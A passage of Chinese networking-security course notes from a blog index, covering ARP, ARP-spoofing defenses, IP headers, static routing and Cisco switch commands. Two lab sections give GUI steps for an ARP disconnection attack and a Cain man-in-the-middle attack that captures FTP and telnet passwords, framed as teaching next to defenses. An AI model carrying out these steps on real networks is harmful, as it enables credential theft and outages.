title="需要ARP协议的数据包发送情景：不清楚目标IP地址的MAC地址"></a>需要ARP协议的数据包发送情景：不清楚目标IP地址的MAC地址</h4><p>三层的IP报文到二层的数据链路层进行下一步MAC地址封装时，发现自己不知道目标IP地址的MAC地址是多少，这时，<u>会将自己只差目标MAC地址的数据帧缓存起来</u>，然后去求助ARP协议 通过目标IP地址来获得MAC地址。<u>网络层会生成一个ARP请求报文帮助询问目标MAC地址</u>，请求报文的内容是介绍自己的IP和MAC询问目标IP的MAC，<u>请求报文在二层数据链路层进行封装时，将目标MAC地址填充为MAC广播地址，通过广播发送去询问</u><u>，等待目标IP的主机以单播的形式返回一个ARP应答报文</u>，<u>源主机收到这个报文后会先将询问到的目标MAC地址缓存到自己主机内存中的ARP缓存表中，然后填充之前缓存的缺少目标MAC地址的数据帧</u>，成功向目标IP发送。</p><h4 id="情景2：不清楚目标IP地址的MAC地址，并且对方是不同网段"><a href="#情景2：不清楚目标IP地址的MAC地址，并且对方是不同网段" class="headerlink" title="情景2：不清楚目标IP地址的MAC地址，并且对方是不同网段"></a>情景2：不清楚目标IP地址的MAC地址，并且对方是不同网段</h4><p>此时，目标MAC地址应该<u>填写网关的MAC地址</u>，把数据帧发到网关，网关自然就会查询路由表转发数据帧。因此，如果ARP缓存中没有网关的地址，则会发送一个网络层的ARP请求广播包询问网关的MAC地址，最终得到网关单播回应ARP响应包。最后把网关的MAC地址放到我们前面数据帧的目标MAC地址字段。</p><p>网关收到这个数据帧后，首先查看帧头目标MAC地址是不是我，然后查看帧头中的类型是0800还是0806，如果是0806会丢弃，因为ARP协议是内网协议不路由，如果发现是0800IP协议，则会脱掉二层然后把数据帧送到路由器内部，进行路由表查验，寻找下一跳地址，并将数据帧送到下一跳端口位置。如果此时路由器ARP缓存表中没有下一跳IP地址的MAC地址，则会缓存此帧，向该网段发送ARP请求广播包，得到下一跳IP的单播ARP响应包后，缓存ARP地址表，然后重新封装帧头的MAC地址，注意源MAC地址写路由器发出端口的MAC地址，目标MAC地址要刚获得的下一跳IP地址MAC地址，然后发送该数据包到下一跳。以此类推，直到下一跳位置就是目标网段，同样经历以上过程发出。</p><p><a href="https://imgchr.com/i/NzSWUe"><img src="https://s1.ax1x.com/2020/07/04/NzSWUe.png" alt="NzSWUe.png"></a></p><h3 id="三、ARP工作原理"><a href="#三、ARP工作原理" class="headerlink" title="三、ARP工作原理"></a>三、ARP工作原理</h3><p>ARP工作原理分两个步骤：</p><p>1）发送ARP广播报文：内容是：我的IP是XXX，我的MAC是XXX，谁的IP是XXX，你的MAC地址是啥？？</p><p>2）回应ARP单播报文。</p><blockquote><p>===================================</p><p>pc与其他PC通信，ARP原理: </p><p>1）首先判断目标IP与自己是否在同一网段</p><p>2）如果在同一网段，且ARP缓存表内无此IP，则直接发送ARP广播请求报文询问目标IP地址的MAC </p><p>3）如果不在同一网段，且ARP缓存表内无此IP，则发送ARP广播请求报文询问网关的MAC</p><p>===================================</p></blockquote><h3 id="四、面试题"><a href="#四、面试题" class="headerlink" title="四、面试题"></a>四、面试题</h3><p>1）ARP协议工作在哪一层？ 答：网络层</p><p>2）ARP协议是干什么的？ 答：已知IP地址，解析MAC地址。</p><p>3）可以描述一下ARP的工作原理吗？ 答：见三、。</p><p>4）ARP漏洞在哪里，为什么可以通过ARP漏洞进行攻击？答：ARP收到单播应答数据包时没有身份验证，因此很容易被ARP欺骗。<strong>1、断网攻击</strong>：受到虚假的不存在的MAC地址，后果可能会中断正常的通信。<strong>2、中间人攻击</strong>：通信双方收到中间人的MAC地址的ARP响应单播，中间人截取信息后，再转发给正确的对方。</p><h3 id="五、ARP断网攻击实验"><a href="#五、ARP断网攻击实验" class="headerlink" title="五、ARP断网攻击实验"></a>五、ARP断网攻击实验</h3><p>目标：断网攻击</p><p>实验环境：实验环境：中间人攻击方win2003 、 受攻击方任意</p><p>使用软件： 网络执法官v3.56</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">打开长角牛网络监控机 -》 添加监控范围 -》确定开始扫描 -》 对准攻击目标右键手工管理  -》 选择禁止与所有主机连接，除我的IP外，该网段所有IP欺骗到攻击目标ARP表中（-》 禁止与关键主机进行TCP&#x2F;IP连接 -》 第1组 -》 关键主机组设置 -》 第1组中加入想欺骗攻击目标ARP表中的一些IP地址）</span><br></pre></td></tr></table></figure><h3 id="六、ARP中间人攻击实验"><a href="#六、ARP中间人攻击实验" class="headerlink" title="六、ARP中间人攻击实验"></a>六、ARP中间人攻击实验</h3><p>目标：实现窃取telnet和ftp密码</p><p>使用软件：cain</p><p>实验环境：中间人攻击方win2003 、 telnet/ftp服务器win2003 、 普通用户win7</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、配置内网环境，win7：192.168.1.1、 win2003中间人：192.168.1.2、 telnet&#x2F;ftp服务器：192.168.1.3</span><br><span class="line">2、搭建telnet&#x2F;ftp服务器：</span><br><span class="line">计算机-》管理-》服务-》telnet启动； </span><br><span class="line">驱动硬盘-》安装服务组件-》应用服务器组件-》IIS服务器-》ftp服务器 -》新建一个ftp文件夹 -》在IIS中创建一个FTP站点 -》关闭匿名链接 -》 关闭默认站点 -》 创建一个ftp用户 </span><br><span class="line">3、使用arp -a命令，查看正确的MAC地址情况。</span><br><span class="line">4、开启攻击：攻击机器中安装cain软件 -》 打开cain -》 菜单栏第二个Sniffer -》 选择网卡 -》然后再点击start Sniffer凹进去了 -》 选择Sniffer页面 -》 点击菜单栏中的加号，设置攻击目标的范围 -》 设置rangeIP范围，开始扫描 -》 点击下边的页面APR -》点击空白表格处，再次点击加号，添加攻击目标，左边是目标1、右边是目标2，也就是作为中间人监听欺骗的两方 -》 点击菜单栏第三个生化按钮开始攻击 -》 开始攻击后，再被攻击主机中查看ARP表会发现出现两个相同的MAC地址却不同IP的表项（这也是诊断中间人攻击的方法）</span><br><span class="line">5、演示如果通过攻击获得用户之间的敏感信息：使用用户访问ftp服务器 -》 攻击方点击下边菜单栏的Passwords，可以选择很多应用协议的敏感信息抓取记录，这里选择ftp -》可以查看到抓取到了用户刚才登陆ftp服务器时输入的密码</span><br><span class="line">6、telnet密码泄露方式原理同上 -》 选择telnet协议的信息获取分类 -》 右键view查看截取的敏感信息 -》 记事本设置换行 -》 可以看到password 和 命令等，因为记事本默认编码问题有点乱码。看到addmmiinniissttrraattoorr的双倍重复是因为TCP协议的双重确认机制</span><br><span class="line">7、停止攻击的方法：点击stop apr（菜单栏第三个按钮）</span><br></pre></td></tr></table></figure><h3 id="七、抓包实验"><a href="#七、抓包实验" class="headerlink" title="七、抓包实验"></a>七、抓包实验</h3><p>目标：抓取telnet有密码的报文、arp广播请求报文、arp单播应答报文</p><p>使用软件：科来网络分析系统</p><p>实验环境：win7x64抓包机器、win2003</p><p>解决杂乱的数据包显示：实时分析 -》 本地网卡 -》 全面分析 -》 数据包 -》过滤 -》 填写网络协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">安装科来 -》 打开软件选择实时分析 -》 选择网卡 -》 全面分析 -》 开始 -》 选择数据包功能页面 -》 删除win7的ARP表，然后ping win2003 -》分析数据包可以看到，10个包，2个ARP协议包请求和响应，5个ping来回ICMP包 -》 分析ARP广播数据包，帧头帧尾，ARP请求协议包。 -》 分析telnet数据包，找出明文口令</span><br></pre></td></tr></table></figure><h3 id="八、如何防御ARP攻击"><a href="#八、如何防御ARP攻击" class="headerlink" title="八、如何防御ARP攻击"></a>八、如何防御ARP攻击</h3><h4 id="1、ARP双向静态绑定"><a href="#1、ARP双向静态绑定" class="headerlink" title="1、ARP双向静态绑定"></a>1、ARP双向静态绑定</h4><p>两主机静态绑定对方的IP和MAC地址到ARP表中，因为静态绑定优先级大于动态绑定，所以ARP欺骗所获得的动态绑定信息不会生效。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PC： arp -s 网关的IP 网关的MAC地址</span><br><span class="line">cisco路由器： conf t; arp 员工IP 员工MAC arpa</span><br></pre></td></tr></table></figure><p>缺点：工作量太大！必须要双向绑定。</p><p>建议：用在公司的主要服务器上！</p><h4 id="2、-安装ARP防火墙"><a href="#2、-安装ARP防火墙" class="headerlink" title="2、 安装ARP防火墙"></a>2、 安装ARP防火墙</h4><p><strong>ARP防火墙原理（以暴制暴）</strong>：如果是保护断网攻击，首先自动静态绑定网关的ARP记录。如果攻击方将目标转移到欺骗路由器，一旦遭受路由器ARP攻击，ARP防火墙发现断网，则会像攻击方的手段一样，向路由器高频率发送ARP应答单播数据包，以覆盖路由器上错误的ARP记录。</p><p>缺点：增加网络负担！成功率也并不是100%。</p><p>360中的ARP防火墙一般默认不开启，在需要的时候手动开启。</p><h4 id="3、在企业级交换机上启用DAI技术"><a href="#3、在企业级交换机上启用DAI技术" class="headerlink" title="3、在企业级交换机上启用DAI技术"></a>3、在企业级交换机上启用DAI技术</h4><blockquote><p><strong>通过交换机查DHCP Snooping表的方式，核对ARP协议包源IP和MAC的信息是否正确。从源头防护ARP欺骗！</strong></p></blockquote><p><strong>DHCP Snooping技术</strong>：DHCP Snooping是DHCP（Dynamic Host Configuration Protocol）的一种安全特性，监听DHCP ACK、NAK、Offer报文，用于保证DHCP客户端从合法的DHCP服务器获取IP地址。使用DHCP Snooping技术，连接到此路由器的主机<u>必须自动获取IP地址</u>，如果手动则交换机接收不到DHCP ACK、NAK、Offer报文，则会down掉该接口。在企业级交换机上，支持此技术，该技术在交换机中维护一个<u>DHCP Snooping信息表</u>，表中包含了交换机所有端口上主机的IP和MAC地址。获得这些信息的前提是主机与DHCP服务器进行联系，请求IP分配的服务。企业级交换机上的Snooping技术会<u>捕捉该端口上主机请求<strong>DHCP</strong>服务过程</u>中Discovery数据包带有的MAC地址和ACK数据包带有的IP地址记录到Snooping信息表中。</p><p><strong>DAI（Dynamic ARP Inspection）</strong>动态ARP检测：DAI 以 DHCP Snooping绑定表为基础，同时开启ARP check功能。ARP check会检测每个端口发出的网络层协议是否是ARP协议，如果是则检测ARP包中发送方的IP地址与MAC地址与DHCP Snooping表中的记录是否匹配。如果匹配则通过，如果不匹配则有两种选择：丢弃或直接down掉该端口，并记录日志。</p><p><a href="https://imgchr.com/i/UpdVMD"><img src="https://s1.ax1x.com/2020/07/05/UpdVMD.png" alt="UpdVMD.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>15、IP协议分析与静态路由</title>
      <link href="/2020/06/20/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/15%E3%80%81IP%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E4%B8%8E%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1/"/>
      <url>/2020/06/20/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/15%E3%80%81IP%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E4%B8%8E%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1/</url>
      
        <content type="html"><![CDATA[<h2 id="15、IP协议分析与静态路由"><a href="#15、IP协议分析与静态路由" class="headerlink" title="15、IP协议分析与静态路由"></a>15、IP协议分析与静态路由</h2><h3 id="一、IP协议基本特点"><a href="#一、IP协议基本特点" class="headerlink" title="一、IP协议基本特点"></a>一、IP协议基本特点</h3><p><strong>IP包头的长度</strong>：20-60字节</p><p><strong>IP包的分片技术</strong>：IP包超过MTU(中国是1500字节)时，需要进行分片。</p><h3 id="二、IP协议包头分析"><a href="#二、IP协议包头分析" class="headerlink" title="二、IP协议包头分析"></a>二、IP协议包头分析</h3><p><a href="https://imgchr.com/i/Nlu7rQ"><img src="https://s1.ax1x.com/2020/06/20/Nlu7rQ.png" alt="Nlu7rQ.png"></a></p><p><strong>版本</strong></p><blockquote><p>IP地址版本 IPV4、IPV6。</p><p>IPV4地址：32位bit； IPV6地址：128位bit。</p></blockquote><p><strong>首部长度</strong></p><blockquote><p>标识IP包头的长度。</p></blockquote><p><strong>优先级与服务类型</strong></p><p><strong>总长度</strong></p><blockquote><p>标识整个IP包的长度。</p></blockquote><p><strong>段偏移量</strong></p><blockquote><p>标识IP包的分片顺序/位置</p></blockquote><p><strong>标识符</strong></p><blockquote><p>一个数据流的标识，或者说一组被分片的IP包的统一标识符。</p></blockquote><p><strong>标志</strong></p><blockquote><p>第一位 永远为0（保留）</p><p>第二位 0标志着IP包被分片，1标志着IP包没被分片 </p><p>第三位 1标志着不是最后一个分片 0标志着是最后一个分片</p></blockquote><p><strong>首部校验和 相当于二层的FCS</strong></p><blockquote><p>校验IP包头前20字节的数据是否完整。</p></blockquote><p><strong>TTL Time To Live</strong></p><blockquote><p>生存时间：经过路由器的跳数，一旦经过的路由器的次数超过了设置的TTL就丢弃该包。</p><p>TTL范围：1-255（8位）</p><p>Windows系统TTL一般为128、Linux系统一般为1-128之间，如56、64。</p><p>如果返回的包中TTL是255，说明这个地址是在企业级的路由器，也就是网关。</p></blockquote><p><strong>协议号</strong></p><blockquote><p>作用是区分上层协议</p><p>TCP=6； UDP=17；ICMP=1</p></blockquote><h3 id="三、IP分片攻击-Tear-Drop-泪滴攻击"><a href="#三、IP分片攻击-Tear-Drop-泪滴攻击" class="headerlink" title="三、IP分片攻击/Tear Drop 泪滴攻击"></a>三、IP分片攻击/Tear Drop 泪滴攻击</h3><p>通过修改段偏移量值，导致IP包重组失败，CPU可飙到100%，XP后修复了该漏洞。重组失败会直接丢弃，但仍然可以作为攻击手段。</p><p>现在Tear Drop属于DDos攻击，一直循环发错误的段偏移量IP包，仍然可以攻击。</p><h3 id="四、静态路由"><a href="#四、静态路由" class="headerlink" title="四、静态路由"></a>四、静态路由</h3><p><a href="https://imgchr.com/i/NlLHC6"><img src="https://s1.ax1x.com/2020/06/20/NlLHC6.png" alt="NlLHC6.png"></a></p><p><strong>动态路由</strong>：路由器之间可以交换学习彼此的路由表。（占用带宽、占用CPU、价格比较高；方便，无需手工配置）</p><p><strong>静态路由</strong>：手工写路由表。</p><p><strong>路由表：</strong>路由器转发数据的依据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">路由条目类型（C 直连网段、 S 静态配置、S* 默认路由）|  目标网段  |   方向（接口 或者IP地址&#x2F;下一跳）</span><br></pre></td></tr></table></figure><p><strong>路由表的初始学习</strong>：接口配置好开机后，路由表自动形成，并写入路由器上接口的网段地址（前提是所直连的网段可通，也就是对应设备在开机状态、有信号）。例如：C 网段地址 接口号。</p><p><strong>路由器对数据包的丢弃</strong>：路由器在转发数据包时，如果发现路由表里没有目的网段，则会直接丢弃并反馈信息。</p><p><strong>路由器对路由表条目的查询顺序：</strong></p><blockquote><p>按照优先级顺序匹配路由条目，路由条目的优先级与<u>管理距离值</u>成反比，简单点说先看C、再看S、再看S*</p><p><u>管理距离值</u>：每一个路由条目类型都有一个默认的管理值。C=0, S=1, S*=无穷大</p><p>所以路由条目类型的优先级为：C &gt; S &gt;  S*</p></blockquote><p><strong>默认路由：</strong><code>S* 0.0.0.0/0 VIA 共同方向</code> 称为默认路由。0.0.0.0(ip) 0.0.0.0(netmask) 代表所有网段。一般给边缘路由器（通向其他网段只有一条路）或多条目标网段相同的路由条目使用默认路由进行优化。</p><p><a href="https://imgchr.com/i/NGaV4P"><img src="https://s1.ax1x.com/2020/06/22/NGaV4P.png" alt="NGaV4P.png"></a></p><p><strong>浮动路由</strong>：配置路由时通过提高路由条目的管理距离值，来实现备用路由的启用。</p><p><a href="https://imgchr.com/i/NGrNgx"><img src="https://s1.ax1x.com/2020/06/22/NGrNgx.png" alt="NGrNgx.png"></a></p><h3 id="五、默认路由配置的注意事项（会引起路由环路）"><a href="#五、默认路由配置的注意事项（会引起路由环路）" class="headerlink" title="五、默认路由配置的注意事项（会引起路由环路）"></a>五、默认路由配置的注意事项（会引起路由环路）</h3><p>两个<strong>直连</strong>的路由器不要互相指向默认路由，这样的话，一旦出现错误的未知网段的数据包就会在两个默认路由之间互相传递形成路由环路，直到TTL耗尽。（两个直连路由器之间放一个正常静态配置的路由器就不会出现这种问题，这是因为发现未知网段的数据包直接处理。）</p><p><a href="https://imgchr.com/i/UEyZHs"><img src="https://s1.ax1x.com/2020/07/08/UEyZHs.png" alt="UEyZHs.png"></a></p><h3 id="六、实验"><a href="#六、实验" class="headerlink" title="六、实验"></a>六、实验</h3><blockquote><p>路由器选择2811，同种设备互连使用交叉线（PC和路由器视作同种设备）。</p><p>1、配置所有IP地址，并启动</p><p>2、写路由（静态+默认）</p><p><strong>查看路由表</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show ip route</span><br></pre></td></tr></table></figure><p><strong>静态配置路由表</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conf t</span><br><span class="line">ip route 目标网段 目标网段子网掩码 下一跳IP地址 &#x2F;&#x2F;静态配置路由网段</span><br><span class="line">ip route 0.0.0.0 0.0.0.0 下一跳IP地址    &#x2F;&#x2F;默认配置所有网段</span><br></pre></td></tr></table></figure><p>0.0.0.0 0.0.0.0 代表所有网段。</p><p><strong>静态配置浮动路由</strong></p><p>实际就是通过提高路由条目的管理距离值，来实现路由的备份。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip route 目标网段 目标网段子网掩码 下一跳IP地址 管理距离值 &#x2F;&#x2F;静态配置路由网段并配置管理距离值，也称为配置浮动路由（一般用于做备用网段配置）</span><br></pre></td></tr></table></figure></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>14、交换机的基本命令</title>
      <link href="/2020/06/16/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/14%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/"/>
      <url>/2020/06/16/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/14%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="14、交换机的基本命令"><a href="#14、交换机的基本命令" class="headerlink" title="14、交换机的基本命令"></a>14、交换机的基本命令</h2><h3 id="一、设备的工作模式"><a href="#一、设备的工作模式" class="headerlink" title="一、设备的工作模式"></a>一、设备的工作模式</h3><p><strong>用户模式</strong></p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Switch&gt;</span><br></pre></td></tr></table></figure><p><strong>权限低</strong>，可以查看交换机的基本配置简单信息，且不能做任何修改。</p></blockquote><p><strong>特权模式</strong></p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Switch&gt; enable</span><br><span class="line">Switch#</span><br><span class="line">在其他模式下使用特权命令可以使用 do + 命令，强制执行</span><br></pre></td></tr></table></figure><p>可以查看所有配置，但不能修改配置！可以做重大性操作，保存所有配置，重启设备，恢复出厂等！</p></blockquote><p><strong>全局配置模式</strong></p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Switch# configure terminal</span><br><span class="line">Switch(config)#</span><br></pre></td></tr></table></figure><p>默认不能查看配置！可以修改配置，且全局生效！</p></blockquote><p><strong>接口配置模式</strong></p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#  int f0&#x2F;2</span><br><span class="line">Switch(config-if)#</span><br></pre></td></tr></table></figure><p>默认不能查看配置！可以修改配置，且只对该端口生效。</p></blockquote><p><strong>控制台模式</strong></p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)# &gt; line console 0</span><br><span class="line">Switch(config-line)#</span><br></pre></td></tr></table></figure><p>接口编号备注：</p><p>F0/1，E0/1，G0/1，TE0/1</p><p>0是模块号，1是接口号</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ctrl + u #快速删除光标前所有字符</span><br><span class="line">ctrl + a #快速定位光标到行首</span><br><span class="line">ctrl + e #快速定位光标到行尾</span><br><span class="line">ctrl + shift + 6 #停止交换机广播解析命令</span><br></pre></td></tr></table></figure><h3 id="二、常用基本命令"><a href="#二、常用基本命令" class="headerlink" title="二、常用基本命令"></a>二、常用基本命令</h3><p><strong>设置设备名/主机名</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)# hostname bj-sw-1-1    &#x2F;&#x2F;北京分公司一楼一台交换机</span><br><span class="line">bj-sw-1-1(config)#</span><br></pre></td></tr></table></figure><p><strong>设置交换机控制台登录密码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)# line console 0</span><br><span class="line">Switch(config-line)# password  密码         &#x2F;&#x2F;设置登录密码，至少设置6位比较好</span><br><span class="line">Switch(config-line)# login                 &#x2F;&#x2F;开启账号验证模式</span><br></pre></td></tr></table></figure><p><strong>设置特权模式登录密码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)# enable password 密码        &#x2F;&#x2F;设置特权模式切换密码</span><br><span class="line">Switch(config)# enable secret 密码        &#x2F;&#x2F;密文的特权密码</span><br></pre></td></tr></table></figure><p><strong>查看接口列表</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show ip interface brief</span><br></pre></td></tr></table></figure><p><strong>查看MAC地址表</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show mac-address-table</span><br></pre></td></tr></table></figure><p><strong>保存配置文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">write</span><br><span class="line">copy running-config startup-config</span><br></pre></td></tr></table></figure><p><strong>查看当前缓存配置</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show running-config</span><br></pre></td></tr></table></figure><p><strong>删除配置</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">erase startup-config  &#x2F;&#x2F;删除硬盘配置文件</span><br><span class="line">删除某条配置，在配置某条配置的模式下 no + 配置项</span><br></pre></td></tr></table></figure><p><strong>重启命令</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reload</span><br></pre></td></tr></table></figure><p><strong>开启/禁止路由器接口命令</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">no shutdown</span><br><span class="line">shutdown</span><br></pre></td></tr></table></figure><p><strong>开启路由器的telnet服务</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">line vty 0 4</span><br><span class="line">password XXX</span><br><span class="line">login</span><br><span class="line">enable password XXXX</span><br></pre></td></tr></table></figure><p><strong>开启telnet本地用户登录模式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">line vty 0 4</span><br><span class="line">login local</span><br><span class="line"># username XXX password XXXX</span><br></pre></td></tr></table></figure><h3 id="三、企业级二层交换机的虚拟端口-PC-vlan"><a href="#三、企业级二层交换机的虚拟端口-PC-vlan" class="headerlink" title="三、企业级二层交换机的虚拟端口/PC vlan"></a>三、企业级二层交换机的虚拟端口/PC vlan</h3><p>企业级交换机中，内置了一个虚拟PC/虚拟端口。可以配置IP，称为交换机的管理IP。</p><p><strong>配置交换机的vlan端口（给交换机起名字，方便被telnet远程管理！）</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int vlan1</span><br><span class="line">ip address XX XX</span><br><span class="line">no shutdown</span><br></pre></td></tr></table></figure><p><strong>给交换机的vlan端口配置网关（实现客户机控制不同网段的交换机）</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#config ： ip default-gateway 20.1.1.254</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>13、数据链路层</title>
      <link href="/2020/06/14/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/13%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/"/>
      <url>/2020/06/14/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/13%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><h4 id="一、数据链路层的概述"><a href="#一、数据链路层的概述" class="headerlink" title="一、数据链路层的概述"></a>一、数据链路层的概述</h4><p>TCP/IP第二层模型：数据链路层，传输单元是<u>帧</u>(frame)。</p><p><strong>数据链路层工作设备</strong>：交换机（组件 以太网/内网/局域网 的核心）。</p><p><strong>数据链路层协议</strong>：<u>MAC子层协议</u>，用于封装帧头、帧尾。</p><p><a href="https://imgchr.com/i/NSse2j"><img src="https://s1.ax1x.com/2020/06/14/NSse2j.png" alt="NSse2j.png"></a></p><h4 id="二、帧结构的组成"><a href="#二、帧结构的组成" class="headerlink" title="二、帧结构的组成"></a>二、帧结构的组成</h4><p><strong>帧结构的组成</strong>：MAC子层 + 上三层数据 + FCS</p><p><a href="https://imgchr.com/i/NSsMq0"><img src="https://s1.ax1x.com/2020/06/14/NSsMq0.png" alt="NSsMq0.png"></a></p><h5 id="MAC子层头部（帧头）"><a href="#MAC子层头部（帧头）" class="headerlink" title="MAC子层头部（帧头）"></a>MAC子层头部（帧头）</h5><p>MAC子层头部包含：目标MAC地址（6字节）、源MAC地址（6字节）、类型（2字节）</p><blockquote><p>MAC地址：物理地址，是固化到网卡的全球唯一标识。前三字节标识厂家(IBM:00-06-1b)，后S三字节是编号。</p><p>类型：区分上层协议（网络层），0800 IP协议、0806 ARP协议。</p><p>DOS管道命令： ipconfig /all | find “物理地址”</p></blockquote><h5 id="FCS-Frame-Check-Sequence-帧尾"><a href="#FCS-Frame-Check-Sequence-帧尾" class="headerlink" title="FCS, Frame Check Sequence(帧尾)"></a>FCS, Frame Check Sequence(帧尾)</h5><p>FCS（4字节）：帧数据校验序列，用于校验帧的完整性。（压缩计算除FCS的帧数据）</p><h4 id="三、帧的最大承载能力限制"><a href="#三、帧的最大承载能力限制" class="headerlink" title="三、帧的最大承载能力限制"></a>三、帧的最大承载能力限制</h4><p>MTU（最大传输单元）：除了帧头、帧尾，上三层数据最大1500B。</p><p><a href="https://imgchr.com/i/NSgnYT"><img src="https://s1.ax1x.com/2020/06/14/NSgnYT.png" alt="NSgnYT.png"></a></p><h4 id="四、数据链路层的网络设备"><a href="#四、数据链路层的网络设备" class="headerlink" title="四、数据链路层的网络设备"></a>四、数据链路层的网络设备</h4><h5 id="交换机特点"><a href="#交换机特点" class="headerlink" title="交换机特点"></a>交换机特点</h5><h6 id="接口标记"><a href="#接口标记" class="headerlink" title="接口标记"></a>接口标记</h6><p>E口：10Mb/s； F口：100Mb/s； G口：1000Mb/s； Te口：10000Mb/s </p><h6 id="模块标记"><a href="#模块标记" class="headerlink" 